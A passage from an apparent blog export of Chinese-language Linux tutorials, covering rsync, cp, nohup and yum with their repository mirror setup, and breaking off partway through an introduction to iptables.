2、在rsync服务器端不指定用户&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在服务端也就是主机yanyi-1上修改配置文件rsyncd.conf，去掉关于认证账户的配置项(auth user和secrets file这两行)： 1sed -i 's/auth users/#auth users/;s/secrets file/#secrets file/' /etc/rsyncd.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面的命令是把“auth users”和“secrets file”两行的最前面加一个“#”，这样就把这两行注释掉了，使其失去意义。sed的这种用法，只是用分号把两个替换的子命令块给替换了。然后到客户端主机yanyi上测试： 12345678910111213rsync -avL 192.168.0.10::test/test1/ /tmp/test9/receiving incremental file listcreated directory /tmp/test9./11.txt22.txt34test.txtsent 162 bytes received 410 bytes 1144.00 bytes/sectotal size is 0 speedup is 0.00 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意，这里不用再加test这个用户了，默认是以root的身份拷贝的，现在已经不需要输入密码了。 实例8：根据一个文件列表文档来同步&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有时候，需要根据一个文档中的文件列表来同步文件。例，1.txt是文件列表，内容为： 1234cat 1.txt/data/a/a.txt/data/b.txt/data/c/b/c.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;同步命令是： 1rsync -av --files-from=1.txt / ip::module/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;需要注意的是，1.txt中如果写全局路径，那么source目录需要写/ 实例9：在远程自动创建目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;默认情况下，使用rsync的时候，不能自动创建级联目录。 1rsync -a /data/1/2/3/1.txt 1.1.1.1:/data/1/2/3/1.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样会报错的。改一改上边的命令 1rsync -a /data/1/2/3/1.txt 1.1.1.1:/data/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样同样也达不到想要的效果。虽然不在报错，但是只是把1.txt放到了1.1.1.1:/data/目录下。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;rsync有个选项就是-R，会帮助我们自动创建级联目录。所以上边的命令应该改成 1rsync -aR /data/1/2/3/1.txt 1.1.1.1:/data/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样就会在1.1.1.1:/data/目录下创建1/2/3/这样的级联目录，类似mkdir -p 实例10：只同步指定类型的文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;需求：同步某个目录下所有的图片（*.jpg），该目录下有很多其他的文件，但只想同步*.jpg的文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;rsync有一个 --exclude 可以排除指定文件，还有一个 --include 选项的作用正好和 --exclude 相反。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;直接使用 --include=&quot;*.jpg&quot; 可否实现？ 1rsync -av --include="*.jpg" /src/ /des/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;实验证明，这是不对的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;正确的答案是： 1rsync -av --include="*.jpg" --exclude=* /src/ /des/]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- cp]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F9.%20Linux%20%E5%91%BD%E4%BB%A4-%20cp%2F</url>
    <content type="text"><![CDATA[Linux 命令- cp&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;cp命令用来复制文件或者目录，是Linux系统中最常用的命令之一。一般情况下，shell会设置一个别名，在命令行下复制文件时，如果目标文件已经存在，就会询问是否覆盖，不管你是否使用-i参数。但是如果是在shell脚本中执行cp时，没有-i参数时不会询问是否覆盖。这说明命令行和shell脚本的执行方式有些不同。 1．命令格式：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用法： 1cp [选项] [-T] [源] [目的] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或： 1cp [选项] [源] [目录] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或: 1cp [选项] [-t] [目录] [源] 2．命令功能：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将源文件复制至目标文件，或将多个源文件复制至目标目录。 3．命令参数： -a, –archive 等于-dR –preserve=all –backup[=CONTROL 为每个已存在的目标文件创建备份 -b 类似–backup 但不接受参数 –copy-contents 在递归处理是复制特殊文件内容 -d 等于–no-dereference –preserve=links -f, –force 如果目标文件无法打开则将其移除并重试(当 -n 选项 存在时则不需再选此项) -i, –interactive 覆盖前询问(使前面的 -n 选项失效) -H 跟随源文件中的命令行符号链接 -l –link 链接文件而不复制 -L –dereference 总是跟随符号链接 -n –no-clobber 不要覆盖已存在的文件(使前面的 -i 选项失效) -P –no-dereference 不跟随源文件中的符号链接 -p 等于–preserve=模式,所有权,时间戳 –preserve[=属性列表 保持指定的属性(默认：模式,所有权,时间戳)，如果可能保持附加属性：环境、链接、xattr 等 -R, -r, –recursive 复制目录及目录内的所有项目 4．命令实例：实例1：复制单个文件到目标目录，文件在目标文件中不存在&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1cp log.log test5 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 123456789101112[root@localhost test]# cp log.log test5[root@localhost test]# ll-rw-r--r-- 1 root root 0 10-28 14:48 log.logdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxrwx 2 root root 4096 10-28 14:47 test3drwxr-xr-x 2 root root 4096 10-28 14:53 test5[root@localhost test]# cd test5[root@localhost test5]# ll-rw-r--r-- 1 root root 0 10-28 14:46 log5-1.log-rw-r--r-- 1 root root 0 10-28 14:46 log5-2.log-rw-r--r-- 1 root root 0 10-28 14:46 log5-3.log-rw-r--r-- 1 root root 0 10-28 14:53 log.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在没有带-a参数时，两个文件的时间是不一样的。在带了-a参数时，两个文件的时间是一致的。 实例2：目标文件存在时，会询问是否覆盖&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1cp log.log test5 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12345678910[root@localhost test]# cp log.log test5cp：是否覆盖“test5/log.log”? n[root@localhost test]# cp -a log.log test5cp：是否覆盖“test5/log.log”? y[root@localhost test]# cd test5/[root@localhost test5]# ll-rw-r--r-- 1 root root 0 10-28 14:46 log5-1.log-rw-r--r-- 1 root root 0 10-28 14:46 log5-2.log-rw-r--r-- 1 root root 0 10-28 14:46 log5-3.log-rw-r--r-- 1 root root 0 10-28 14:48 log.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;目标文件存在时，会询问是否覆盖。这是因为cp是cp -i的别名。目标文件存在时，即使加了-f标志，也还会询问是否覆盖。 实例3：复制整个目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1cp -a test3 test5 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;目标目录存在时： 12345678910111213[root@localhost test]# cp -a test3 test5 [root@localhost test]# ll-rw-r--r-- 1 root root 0 10-28 14:48 log.logdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxrwx 2 root root 4096 10-28 14:47 test3drwxr-xr-x 3 root root 4096 10-28 15:11 test5[root@localhost test]# cd test5/[root@localhost test5]# ll-rw-r--r-- 1 root root 0 10-28 14:46 log5-1.log-rw-r--r-- 1 root root 0 10-28 14:46 log5-2.log-rw-r--r-- 1 root root 0 10-28 14:46 log5-3.log-rw-r--r-- 1 root root 0 10-28 14:48 log.logdrwxrwxrwx 2 root root 4096 10-28 14:47 test3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;目标目录不存在是： 12345678[root@localhost test]# cp -a test3 test4[root@localhost test]# ll-rw-r--r-- 1 root root 0 10-28 14:48 log.logdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxrwx 2 root root 4096 10-28 14:47 test3drwxrwxrwx 2 root root 4096 10-28 14:47 test4drwxr-xr-x 3 root root 4096 10-28 15:11 test5[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意目标目录存在与否结果是不一样的。目标目录存在时，整个源目录被复制到目标目录里面 实例4：复制的 log.log 建立一个连结档 log_link.log&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令： 1cp -s log.log log_link.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出： 12345678[root@localhost test]# cp -s log.log log_link.log[root@localhost test]# lllrwxrwxrwx 1 root root 7 10-28 15:18 log_link.log -&gt; log.log-rw-r--r-- 1 root root 0 10-28 14:48 log.logdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxrwx 2 root root 4096 10-28 14:47 test3drwxrwxrwx 2 root root 4096 10-28 14:47 test4drwxr-xr-x 3 root root 4096 10-28 15:11 test5 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;那个 log_link.log 是由 -s 的参数造成的，建立的是一个『快捷方式』，所以您会看到在文件的最右边，会显示这个文件是『连结』到哪里去的！]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- nohup]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F83.%20Linux%20%E5%91%BD%E4%BB%A4-%20nohup%2F</url>
    <content type="text"><![CDATA[Linux 命令- nohup&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在应用Unix/Linux时，我们一般想让某个程序在后台运行，于是我们将常会用 &amp; 在程序结尾来让程序自动运行。比如我们要运行mysql在后台： /usr/local/mysql/bin/mysqld_safe –user=mysql &amp;。可是有很多程序并不想mysqld一样，这样我们就需要nohup命令 命令语法1nohup command [Arg……] [&amp;] 命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不挂断的运行命令。 命令描述&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;nohup命令运行由command参数和任何香断的Arg参数指定的命令，忽略所有挂断（SIGHUP）信号。在注销后使用nohup命令运行后台中的程序。要运行后台中的nohup命令，添加 &amp; （表示“and”的符号）到命令的尾部。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;无论是否将nohup命令的输出重定向到终端，输出都将附加到当前目录的nohup.out文件中。如果当前目录的nohup.out文件不可写，输出重定向到$HOME/nohup.out文件中。如果没有文件能创建或打开以用于追加，那么Command参数指定的命令不可调用。如果标准错误是一个终端，那么把指定的命令写给标准错误的所有输出作为标准输出重定向到相同的文件描述符。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;退出状态：该命令返回下列出口值： 126 可以查找但不能调用Command参数指定的命令。 127 nohup命令发生错误或不能查找有Command参数指定的命令。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;否则，nohup命令的退出状态是Command参数指定命令的退出状态。 nohup命令及其输出文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果你正在运行一个进程，而且你觉得在退出账户时该进程还不会结束，那么可以使用nohup命令。该命令可以在退出账户或者关闭终端之后继续运行相应的进程。nohup就是不挂起的意思（ no hang up）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该命令的一般形式为：nohup command &amp; 使用nohup命令提交作业&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用nohup提交作业，那么在缺省情况下该作业的所有输出都被重定向到一名为nohup.out的文件中，除非另外指定了输出文件： 1nohup command &gt; muout.file 2&gt;&amp;1 &amp; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上例中，输出被重定向到myout.file文件中。 实例123456[root@localhost ~]# cat /usr/local/sbin/sleep.sh#! /bin/bashsleep 1000[root@localhost ~]# nohup sh /usr/local/sbin/sleep.sh &amp;[1] 19997[root@localhost ~]# nohup: 忽略输入并把输出追加到"nohup.out" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;直接加一个 &amp; 虽然丢到后台了，但是当退出该终端时很有可能这个脚本也会退出，而在前面加上 nohup 就没有问题了，nohup的作用就是不挂断运行的命令。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- yum]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F73.%20Linux%20%E5%91%BD%E4%BB%A4-%20yum%2F</url>
    <content type="text"><![CDATA[Linux 命令- yum&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;yum（ Yellow dog Updater, Modified）是一个在Fedora和RedHat以及SUSE中的Shell前端软件包管理器。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;基於RPM包管理，能够从指定的服务器自动下载RPM包并且安装，可以自动处理依赖性关系，并且一次安装所有依赖的软体包，无须繁琐地一次次下载、安装。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;yum提供了查找、安装、删除某一个、一组甚至全部软件包的命令，而且命令简洁而又好记。 yum 语法1yum [options] [command] [package ...] options：可选，选项包括-h（帮助），-y（当安装过程提示选择全部为”yes”），-q（不显示安装的过程）等等。 command：要进行的操作。 package操作的对象。 yum常用命令 列出所有可更新的软件清单命令：yum check-update 更新所有软件命令：yum update 仅安装指定的软件命令：yum install 仅更新指定的软件命令：yum update 列出所有可安裝的软件清单命令：yum list 删除软件包命令：yum remove 查找软件包 命令：yum search 清除缓存命令: yum clean packages: 清除缓存目录下的软件包 yum clean headers: 清除缓存目录下的 headers yum clean oldheaders: 清除缓存目录下旧的 headers yum clean, yum clean all (= yum clean packages; yum clean oldheaders) :清除缓存目录下的软件包及旧的headers 使用实例实例1：安装 pam-devel12345678910111213[root@www ~]# yum install pam-develSetting up Install ProcessParsing package install argumentsResolving Dependencies &lt;==先检查软件的属性相依问题--&gt; Running transaction check---&gt; Package pam-devel.i386 0:0.99.6.2-4.el5 set to be updated--&gt; Processing Dependency: pam = 0.99.6.2-4.el5 for package: pam-devel--&gt; Running transaction check---&gt; Package pam.i386 0:0.99.6.2-4.el5 set to be updatedfilelists.xml.gz 100% |=========================| 1.6 MB 00:05filelists.xml.gz 100% |=========================| 138 kB 00:00-&gt; Finished Dependency Resolution……(省略) 实例2:移除 pam-devel1234567891011121314151617181920212223242526272829303132[root@www ~]# yum remove pam-develSetting up Remove ProcessResolving Dependencies &lt;==同样的，先解决属性相依的问题--&gt; Running transaction check---&gt; Package pam-devel.i386 0:0.99.6.2-4.el5 set to be erased--&gt; Finished Dependency ResolutionDependencies Resolved============================================================================= Package Arch Version Repository Size=============================================================================Removing: pam-devel i386 0.99.6.2-4.el5 installed 495 kTransaction Summary=============================================================================Install 0 Package(s)Update 0 Package(s)Remove 1 Package(s) &lt;==还好，并没有属性相依的问题，单纯移除一个软件Is this ok [y/N]: yDownloading Packages:Running rpm_check_debugRunning Transaction TestFinished Transaction TestTransaction Test SucceededRunning Transaction Erasing : pam-devel ######################### [1/1]Removed: pam-devel.i386 0:0.99.6.2-4.el5Complete! 实例3:利用 yum 的功能，找出以 pam 为开头的软件名称有哪些？123456789101112[root@www ~]# yum list pam*Installed Packagespam.i386 0.99.6.2-3.27.el5 installedpam_ccreds.i386 3-5 installedpam_krb5.i386 2.2.14-1 installedpam_passwdqc.i386 1.0.2-1.2.2 installedpam_pkcs11.i386 0.5.3-23 installedpam_smb.i386 1.1.7-7.2.1 installedAvailable Packages &lt;==底下则是『可升级』的或『未安装』的pam.i386 0.99.6.2-4.el5 basepam-devel.i386 0.99.6.2-4.el5 basepam_krb5.i386 2.2.14-10 base 国内 yum 源阿里yum源安装&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;阿里云与yum源是国内最好的yum源之一。 备份1mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup 下载新的CentOS-Base.repo 到/etc/yum.repos.d/CentOS 51wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-5.repo CentOS 61wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-6.repo CentOS 71wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo 之后运行yum makecache生成缓存12yum clean allyum makecache 网易yum源安装&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;网易（163）yum源是国内最好的yum源之一 ，无论是速度还是软件版本，都非常的不错。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将yum源设置为163 yum，可以提升软件包安装和更新的速度，同时避免一些常见软件版本无法找到。 安装步骤首先备份/etc/yum.repos.d/CentOS-Base.repo1mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup 下载对应版本repo文件, 放入/etc/yum.repos.d/(操作前请做好相应备份) CentOS5 ：http://mirrors.163.com/.help/CentOS5-Base-163.repo CentOS6 ：http://mirrors.163.com/.help/CentOS6-Base-163.repo 运行以下命令生成缓存12yum clean allyum makecache &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;除了阿里和网易之外，国内还有其他不错的yum源，比如中科大和搜狐。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;中科大的yum源，安装方法查看：https://lug.ustc.edu.cn/wiki/mirrors/help/centos &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sohu的yum源安装方法查看: http://mirrors.sohu.com/help/centos.html 配置本地yum仓库&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;实现此案例需要按照如下步骤进行。 步骤一：搭建一个本地Yum，将RHEL6光盘手动挂载到/media&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令操作如下所示： 1234[root@localhost ~]# mount /dev/cdrom /media/mount: block device /dev/sr0 is write-protected, mounting read-only[root@localhost ~]# mount | tail -1/dev/sr0 on /media type iso9660 (ro) 步骤二：将本地设置为客户端，进行Yum验证&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Yum客户端需编辑配置文件，命令操作如下所示： 123456789101112131415161718192021[root@localhost ~]# cd /etc/yum.repos.d/ //必须在这个路径下[root@localhost yum.repos.d]# ls //此路径下事先有配置文件的模板rhel-source.repo[root@localhost yum.repos.d]# cp rhel-source.repo rhel6.repo //配置文件必须以.repo结尾[root@localhost yum.repos.d]# vim rhel6.repo[rhel-6] //中括号里内容要求唯一，但不要出现特殊字符name=Red Hat Enterprise Linux 6 //此为描述信息，可以看情况填写baseurl=file:///media/ //此项为yum软件仓库位置，指向光盘挂载点enabled=1 //此项为是否开启，1为开启0为不开启gpgcheck=1 //此项为是否检查签名，1为监测0为不检测gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-redhat-release //签名认证信息的路径[root@localhost /]# yum repolistLoaded plugins: product-id, refresh-packagekit, security, subscription-managerThis system is not registered to Red Hat Subscription Management. You can use subscription-manager to register.rhel-6 | 3.9 kB 00:00 ... rhel-6/primary_db | 3.1 MB 00:00 ... repo id repo name statusrhel-6 Red Hat Enterprise Linux 6 3,690repolist: 3,690 yum安装“epel”扩展源&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用yum安装rpm包时，经常遇到一些包没有，这时候你可以尝试安装epel的扩展源，这里有很多系统不自带的rpm包。 12[root@localhost ~]# yum install -y epel-release[root@localhost ~]# yum list &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;你会发现最右侧出现很多epel的rpm包。 阿里云扩展源：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下载 1wget -P /etc/yum.repos.d/ http://mirrors.aliyun.com/repo/epel-6.repo &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;也可以rpm安装 1rpm -ivh http://mirrors.zju.edu.cn/epel/6/x86_64/epel-release-6-8.noarch.rpm Remi源&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安装REMI仓库之前，需要启用EPEL仓库，因为REMI中的一些包依赖于EPEL仓库 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在CentOS 7上: 12rpm --import http://rpms.famillecollet.com/RPM-GPG-KEY-remirpm -ivh http://rpms.famillecollet.com/enterprise/remi-release-7.rpm &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在CentOS 6上: 12rpm --import http://rpms.famillecollet.com/RPM-GPG-KEY-remirpm -ivh http://rpms.famillecollet.com/enterprise/remi-release-6.rpm &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;默认地，REMI是禁用的。要检查REMI是否已经成功安装，使用这个命令。你会看到几个REMI仓库，比如remi、remi-php55和remi-php56。 1yum repolist disabled|grep remi 从REMI仓库中安装一个包&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如上所述，最好保持禁用REMI仓库，只有在需要的时候再启用。要搜索或安装REMI仓库中的包，使用这些命令: 12yum --enablerepo=remi search &lt;keyword&gt;yum --enablerepo=remi install &lt;package-name&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Remi下载地址 列出可用: yum repolist enabled 列出禁用: yum repolist disabled 列出所有(默认): yum repolist all 列出一个 repo 源(remi) 中可用的包 1yum --disablerepo="*" --enablerepo="ksplice-uptrack" list available yum保留下载个rpm包&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以设置使yum保留已经下载的rpm包，供以后升级或重新安装时使用。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改/etc/yum.conf即可 1234[main]cachedir=/home/soft1/yumcachekeepcache=1debuglevel=2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;chchedir是放置下载的包的地方，可以修改为自己想放置的位置。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;keepcache为1时表示保存已经下载的rpm包。 yum如何下载rpm包到本地&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先要安装一个小插件，yum-plugin-downloadonly.noarch ，不知道包名用 yum -list |grep download搜索 1yum install -y yum-plugin-downloadonly.noarch &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后就可以下载了： 1yum install vte --downloadonly --downloaddir=/tmp 123456789&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;下载vte到指定/tmp下&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;如果已安装过的包这个小插件默认是不能下载的,我们可以用 reinstall 下载，如下图例：![](https://github.com/hcldirgit/image/blob/master/linux%E5%91%BD%E4%BB%A4-yum/01.png?raw=true)```bashyum reinstall vim --downloadonly --downloaddir=/tmp yum配置/etc/yum.conf配置详解：12345678910111213141516171819202122232425262728293031323334cachedir=/var/cache/yum #yum下载的RPM包的缓存目录keepcache=0 #缓存是否保存，1保存，0不保存。debuglevel=2 #调试级别(0-10)，默认为2(具体调试级别的应用，我也不了解)。logfile=/var/log/yum.log #yum的日志文件所在的位置exactarch=1 #在更新的时候，是否允许更新不同版本的RPM包，比如是否在i386上更新i686 的RPM包。obsoletes=1 #这是一个update的参数，具体请参阅yum(8)，简单的说就是相当于upgrade， 允许更新陈旧的RPM包。gpgcheck=1 #是否检查GPG(GNU Private Guard)，一种密钥方式签名。plugins=1 #是否允许使用插件，默认是0不允许，但是我们一般会用yum-fastestmirror这 个插件。installonly_limit=3 #允许保留多少个内核包。exclude=selinux* #屏蔽不想更新的RPM包，可用通配符，多个RPM包之间使用空格分离。/etc/yum.repos.d/ *.repo[fedora] #方括号里面的是软件源的名称，将被yum取得并识别name=Fedora $releasever - $basearch #这里也定义了软件 仓库的名称，通常是为了方便阅读配置文件，一般没什么作用，$releasever变量定义了发行版本，通常是8，9，10等数字，$basearch变 量定义了系统的架构，可以是i386、x86_64、ppc等值，这两个变量根据当前系统的版本架构不同而有不同的取值，这可以方便yum升级的时候选择 适合当前系统的软件包，以下同……failovermethod=priority #failovermethod 有两个值可以选择，priority是默认值，表示从列出的baseurl中顺序选择镜像服务器地址，roundrobin表示在列出的服务器中随机选择exclude=compiz* *compiz* fusion-icon* #exclude这个选项是后来我自己加上去的，用来禁止这个软件仓库中的某些软件包的安装和更新，可以使用通配符，并以空格分隔，可以视情况需要自行添加#baseurl=http://download.fedoraproject.org/pub/fedora/linux/releases/$releasever/Everything/$basearch/os/#上面的一行baseurl第一个字符是'#'表示该行已经被注释，将不会被读取，这一行的意思是指定一个baseurl（源的镜像服务器地址）#mirrorlist=http://mirrors.fedoraproject.org/mirrorlist?repo=fedora-$releasever&amp;arch=$basearch#上面的这一行是指定一个镜像服务器的地址列表，通常是开启的，本例中加了注释符号禁用了，我们可以试试，将$releasever和$basearch替换成自己对应的版本和架构，例如10和i386，在浏览器中打开，我们就能看到一长串镜可用的镜像服务器地址列表。选择自己访问速度较快的镜像服务器地址复制并粘贴到repo文件中，我们就能获得较快的更新速度了，格式如下baseurl所示：baseurl=ftp://ftp.sfc.wide.ad.jp/pub/Linux/Fedora/releases/10/Everything/i386/oshttp://ftp.chg.ru/pub/Linux/fedora/linux/releases/10/Everything/i386/oshttp://ftp.yz.yamagata-u.ac.jp/pub/linux/fedora/linux/releases/10/Everything/i386/oshttp://mirror.nus.edu.sg/fedora/releases/10/Everything/i386/oshttp://mirror.yandex.ru/fedora/linux/releases/10/Everything/i386/oshttp://ftp.twaren.net/Linux/Fedora/linux/releases/10/Everything/i386/oshttp://ftp.itu.edu.tr/Mirror/Fedora/linux/releases/10/Everything/i386/osenabled=1 #这个选项表示这个repo中定义的源是启用的，0为禁用gpgcheck=1 #这个选项表示这个repo中下载的rpm将进行gpg的校验，已确定rpm包的来源是有效和安全的gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-fedora-$basearch #定义用于校验的gpg密钥]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iptables详解]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F81.%20iptables%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[iptables详解iptables简介&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;netfilter/iptables（简称为iptables）组成Linux平台下的包过滤防火墙，与大多数的Linux软件一样，这个包过滤防火墙是免费的，它可以代替昂贵的商业防火墙解决方案，完成封包过滤、封包重定向和网络地址转换（NAT）等功能。 iptables基础&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;规则（rules）其实就是网络管理员预定义的条件，规则一般的定义为“如果数据包头符合这样的条件，就这样处理这个数据包”。规则存储在内核空间的信息 包过滤表中，这些规则分别指定了源地址、目的地址、传输协议（如TCP、UDP、ICMP）和服务类型（如HTTP、FTP和SMTP）等。当数据包与规 则匹配时，iptables就根据规则所定义的方法来处理这些数据包，如放行（accept）、拒绝（reject）和丢弃（drop）等。配置防火墙的 主要工作就是添加、修改和删除这些规则。 iptables和netfilter的关系&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;iptables和netfilter的关系是一个很容易让人搞不清的问题，很多知道iptables却不知道netfilter。其实iptables只是Linux防火墙的管理工具而已，位于/sbin/iptbles。真正实现防火墙功能的是netfilter，它是Linux内核中实现包过滤的内部结构。iptables只是netfilter的一个实现工具。 iptables语法格式1iptables [-t 表名] [命令选项] [链名] [条件匹配] [-j 目标动作或跳转] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：表名、链名、用户指定iptables命令所操作的表和链，命令选项用于指定管理iptables规则的方式（比如：插入、增加、删除、查看等）；条件匹配用户指定对符合什么样条件的数据包进行处理；目标动作或跳转用于指定数据包的处理方式（比如允许通过、拒绝、丢弃、跳转（jump）给其它链处理）。 iptables控制选项基本参数 -A 在指定链的末尾添加（append）一条新的规则 -D 删除（delete）指定链中的某一条规则，可以按规则序号和内容删除 -I 在指定链中插入（insert）一条新的规则，默认在第一行添加 -R 修改、替换（replace）指定链中的某一条规则，可以按规则序号和内容替换 -L 列出（list）指定链中所有的规则进行查看 -E 重命名用户定义的链，不改变链本身 -F 清空（flush） -N 新建（new-chain）一条用户自己定义的规则链 -X 删除指定表中用户自定义的规则链（delete-chain） -P 设置指定链的默认策略（policy） -Z 将所有表的所有链的字节和数据包计数器清零 -n 使用数字形式（numeric）显示输出结果 -v 查看规则表详细信息（verbose）的信息 -V 查看版本(version) -h 获取帮助（help） 描述规则基本参数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这些规则参数用于描述的协议、源地址、目的地址、允许经过的网络接口，以及如何处理这些数据包。这些描述是对规则的基本描述。 -p （protocol）指定协议，可以是tcp、udp、或者icmp，可以使用 all 来指定所有协议；如果不指定 -p 参数，则默认是 all 值，这并不明智，请总是明确指定协议名称。可以使用协议名（如tcp），或者是协议值（比如6代表tcp）来指定协议，映射关系查看 /etc/protocols ；还可以使用 -protocol 参数代替 -p 参数 -s 源地址（source）指定数据包的源地址；参数可以使用IP地址、网络地址、主机名-s 192.168.1.101 指定IP地址，-s 192.168.1.10/24指定网络地址不指定-s参数，就代表所有地址还可以使用 -src 或者 -source -d 目的地址（destination）指定目的地址参数和-s相同还可以使用 -dst 或者 destination -j 执行目标（jump to target）指定了当与规则（RUle）匹配时如何处理数据包可能的值是ACCEPT允许、DROP丢掉、REJECT拒绝、QUEUE队列、RETURN返回、MASQUERADE伪装（地址伪装，算是snat中的一种特例，可以实现自动化的snat）还可以指定其他连接（Chain）作为目标 -i 输入接口（input 